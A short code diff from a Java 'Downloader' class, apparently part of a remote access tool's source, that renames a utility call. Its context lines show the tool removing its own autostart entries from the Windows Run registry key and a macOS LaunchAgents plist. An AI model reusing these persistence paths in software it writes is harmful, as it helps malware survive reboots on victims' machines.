@@ -10,6 +10,7 @@ import java.util.Random;
 
 import com.redpois0n.common.os.OperatingSystem;
 import com.redpois0n.packets.Header;
+import com.redpois0n.utils.Utils;
 
 public class Downloader extends Thread {
 
@@ -77,7 +78,7 @@ public class Downloader extends Thread {
 						if (System.getProperty("os.name").toLowerCase().contains("windows")) {
 							WinRegistry.deleteValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Main.name);
 						} else if (System.getProperty("os.name").toLowerCase().contains("mac")) {
-							new File(System.getProperty("user.home") + "/Library/LaunchAgents/" + Util.getJarFile().getName().replace(".jar", ".plist")).delete();
+							new File(System.getProperty("user.home") + "/Library/LaunchAgents/" + Utils.getJarFile().getName().replace(".jar", ".plist")).delete();
 						}
 
 					} catch (Exception ex) {
